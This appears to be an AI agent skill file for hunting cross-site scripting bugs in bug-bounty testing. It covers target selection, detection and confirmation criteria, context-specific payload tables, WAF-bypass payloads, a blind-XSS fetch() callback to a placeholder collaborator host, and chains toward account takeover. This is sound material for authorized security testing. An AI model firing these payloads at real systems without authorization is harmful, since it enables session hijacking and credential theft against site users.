---
name: hunt-xss
description: "Hunting skill for Cross-Site Scripting (XSS) vulnerabilities. Reflected, stored, DOM, blind XSS — detection patterns, payloads, bypass tables, evidence gates. Use when testing any endpoint that reflects or stores user input."
sources: hackerone_public
---

# Hunt: XSS (Cross-Site Scripting)

## Crown Jewel Targets

High-value XSS targets:
- Admin panels — hijack admin session → ATO
- Payment flows — credential harvesting
- Collaborative features (wiki, markdown, comments) — stored XSS infects all viewers
- SSO/sign-in pages — steal auth tokens across the platform
- SVG/file upload endpoints — bypass CSP + sanitization
- OAuth redirect URIs — steal auth codes

## Detection Patterns

### Reflected XSS
```
?search=<script>alert(1)</script>
?name="><img src=x onerror=alert(1)>
?q={{constructor.constructor('alert(1)')()}}
```
Test: inject in every parameter, check if reflected unencoded in response.

### Stored XSS
- Profile fields: name, bio, website, avatar URL
- Comments, reviews, forum posts
- File upload names
- Email-to-ticket systems

### DOM XSS
- URL fragment: `#<img src=x onerror=alert(1)>`
- Ensure URL, search, and hash parameters reach JS sink like `innerHTML`, `document.write`, `eval`
- Test with Chrome DevTools console

### Blind/Stored XSS
- Error messages: `?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`
- Auth-flow source params: `?Source=`, `?ReturnUrl=`
- Login username field (admin may view audit logs)
- User-Agent header (SOC consoles may render unsafely)
- Referer header (analytics dashboards)
- Email addresses on registration forms
- File upload filenames

**OOB gate:** blind XSS requires an out-of-band callback to confirm. No callback = no finding.

## What Is NOT Confirmation

- ASP.NET request validator rejected `<` → WAF noise, not XSS
- Payload appears URL-encoded or HTML-encoded in response → correct encoding
- Form action contains `%22onclick%3D` → browser does NOT decode URL encoding inside HTML attributes
- `<script>` appears as `&lt;script&gt;` → escaping, not XSS

## What IS Confirmation

- Collaborator callback received after payload injection
- For stored XSS: callback arrives hours/days later when admin views the resource
- User-Agent of callback is a browser (Mozilla/Chrome)

## Payload Tables

### Context: HTML Tag
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Context: HTML Attribute
```
" onfocus=alert(1) autofocus tabindex=1
' onmouseover=alert(1)
```

### Context: JavaScript String
```
'-alert(1)-'
';alert(1)//
```

### Context: URL
```
javascript:alert(1)
```

### WAF Bypass Techniques
```
<ImG sRc=x OnErRoR=alert(1)>
<svg><script>alert&#40;1&#41;</script>
<dETAILS%0aopen%0aonToggLE%0a=%0a[alert](1) x=
<<script>alert(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

## Chain Templates
- XSS + CSRF → ATO (bypass anti-CSRF tokens via XSS)
- XSS + Cache poisoning → persistent XSS for all users
- Stored XSS + SSO → session hijack across all integrated apps
- DOM XSS + OAuth redirect → token theft
